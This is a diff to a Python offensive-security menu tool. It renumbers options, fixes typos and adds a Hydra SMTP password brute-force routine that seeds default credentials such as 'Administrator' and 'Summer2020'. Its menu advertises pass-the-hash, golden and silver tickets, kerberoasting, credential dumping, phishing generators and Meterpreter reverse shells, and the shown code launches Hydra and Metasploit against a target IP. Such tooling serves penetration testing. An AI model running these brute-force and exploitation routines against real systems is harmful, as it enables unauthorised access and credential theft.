@@ -560,11 +560,11 @@ def options():
    print('\u2551' + "(02) Re/Set REMOTE   IP (13) Start HTTPServer (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
    print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) Editor HASH (80) Hydra  WEB (91) SSHKeyID " + '\u2551')
    print('\u2551' + "(04) Re/Set WEBSITE URL (15) MSFCon Rev Shell (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  POP (93) Netcat   " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) PS  Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) MSFCon TOM (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) SMB Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSFCon OWA (96) MySQL    " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86)            (97) WinRm    " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra POP3 (93) Netcat   " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra SMTP (94) SQSH     " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) PS  Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) Hydra  TOM (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) SMB Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSFCon TOM (96) MySQL    " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) MSFCon OWA (97) WinRm    " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87)            (98) RemDesk  " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33) NFSMount (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88)            (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
@@ -3184,7 +3184,7 @@ while True:
    if selection =='81':
       checkParams = testOne()
       
-      if checkParma != 1:
+      if checkParams != 1:
          checkParams = testFour("445")     
       
       if checkParams != 1:
@@ -3221,7 +3221,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - hydra pop3 bruteforce uses port 110
+# Details : Menu option selected - hydra pop3 bruteforce uses port 110 & pop3s?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -3229,7 +3229,7 @@ while True:
       checkParams = testOne()
       
       if checkParams != 1:
-         checkParms = testFour("110")
+         checkParams = testFour("110")
       
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -3252,15 +3252,56 @@ while True:
                print("[+] Adding password 'Summer2020'...")
                command("echo Summer2020 >> " + dataDir + "/passwords.txt")
                
-         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " POP3")
+         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " pop3")
          
          for x in range (0,maxUser):
             USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            HASH[x] = linecache.getline(dataDir + "/passwords.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)
-            HASH[x] = spacePadding(HASH[x], COL4)
-         wipeTokens(VALD)
+            USER[x] = spacePadding(USER[x], COL3)            
+         wipeTokens(VALD)    
             
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='83':
+      checkParams = testOne()
+      
+      if checkParams != 1:
+         checkParams = testFour("25")
+      
+      if checkParams != 1:
+         if os.path.getsize(dataDir + "/usernames.txt") == 0:
+            print("[-] The username file is empty...")
+           
+            if USER[:2] != "''":
+               print("[+] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
+            else:
+               print("[+] Adding user 'Administrator'...")
+               command("echo 'Administrator' >> " + dataDir + "/usernames.txt")
+               
+         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
+            print("[-] Password file is empty...")
+            
+            if HASH[:2] != "''":
+               print("[+] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> " + dataDir + "/passwords.txt")
+            else:
+               print("[+] Adding password 'Summer2020'...")
+               command("echo Summer2020 >> " + dataDir + "/passwords.txt")
+               
+         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " smtp")
+         
+         for x in range (0,maxUser):
+            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
+            USER[x] = spacePadding(USER[x], COL3)            
+         wipeTokens(VALD)                
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3271,7 +3312,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='83':  
+   if selection =='84':  
       if WEB[:5] != "EMPTY":
          print("[*] Attempting a classic tomcat bruteforce againt the specified web address, please wait...")
          
@@ -3311,7 +3352,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='84':
+   if selection =='85':
       checkParms = testFour("80")
       
       if checkParams != 1:
@@ -3345,7 +3386,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '85':
+   if selection == '86':
       checkParms = testFour("443")
       
       if checkParams != 1:
@@ -3367,17 +3408,6 @@ while True:
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER OWA'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          command("xdotool key Ctrl+Tab")
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='86':
-      exit(1)      
             
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
